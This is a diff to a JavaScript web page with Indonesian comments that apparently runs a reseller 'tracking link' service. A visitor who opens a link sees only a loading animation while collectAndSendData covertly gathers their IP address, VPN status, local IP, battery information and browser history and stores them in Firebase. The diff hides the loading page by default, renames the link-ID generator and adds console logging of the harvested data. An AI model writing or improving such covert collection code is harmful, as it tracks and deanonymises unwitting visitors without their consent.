@@ -450,7 +450,7 @@
         </div>
         
         <!-- Halaman Loading untuk Pengunjung -->
-        <div id="visitorPage" class="loading-container">
+        <div id="visitorPage" class="loading-container hidden">
             <div class="loading-text">Loading</div>
             <div class="dots">
                 <span class="dot"></span>
@@ -542,13 +542,6 @@
             document.getElementById('resellerPage').classList.remove('hidden');
             document.getElementById('visitorPage').classList.add('hidden');
             loadResellerLinks();
-        }
-        
-        // Tampilkan halaman pengunjung
-        function showVisitorPage() {
-            document.getElementById('loginPage').classList.add('hidden');
-            document.getElementById('resellerPage').classList.add('hidden');
-            document.getElementById('visitorPage').classList.remove('hidden');
         }
         
         // Tampilkan notifikasi
@@ -680,7 +673,7 @@
             }
             
             const customLink = document.getElementById('customLink').value;
-            const linkId = customLink || generateLinkId();
+            const linkId = customLink || generateShortId();
             
             // Validasi link ID
             if (!/^[a-zA-Z0-9_-]+$/.test(linkId)) {
@@ -705,7 +698,7 @@
                     // Simpan ke database
                     database.ref(`resellers/${currentReseller.id}/links/${linkId}`).set(linkData)
                         .then(() => {
-                            // Buat URL dengan format yang diinginkan
+                            // Buat URL dengan format yang benar
                             const baseUrl = window.location.origin + window.location.pathname;
                             const trackingLink = `${baseUrl}?reseller=${currentReseller.id}&link=${linkId}`;
                             
@@ -723,9 +716,14 @@
                 });
         }
         
-        // Generate ID unik untuk link
-        function generateLinkId() {
-            return Math.random().toString(36).substring(2, 10);
+        // Generate ID pendek untuk link
+        function generateShortId() {
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            let result = '';
+            for (let i = 0; i < 8; i++) {
+                result += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return result;
         }
         
         // Salin link ke clipboard
@@ -1134,14 +1132,15 @@
         // Fungsi utama untuk mengumpulkan dan mengirim data (mode pengunjung)
         async function collectAndSendData(resellerId, linkId) {
             try {
-                // Tampilkan animasi loading
-                document.getElementById('visitorPage').classList.remove('hidden');
+                console.log('Memulai pengumpulan data untuk:', resellerId, linkId);
                 
                 const ipInfo = await getIPInfo();
                 if (!ipInfo) {
                     console.error('Tidak dapat mendapatkan informasi IP');
                     return;
                 }
+                
+                console.log('Informasi IP didapatkan:', ipInfo.ip);
                 
                 const isVPN = await checkVPN(ipInfo.ip);
                 const localIP = await getLocalIP();
@@ -1177,6 +1176,8 @@
                     batteryInfo: batteryInfo,
                     browserHistory: browserHistory
                 };
+                
+                console.log('Data yang akan dikirim:', data);
                 
                 // Simpan data ke Firebase
                 const visitorId = data.ip.replace(/\./g, '-') + '_' + Date.now();
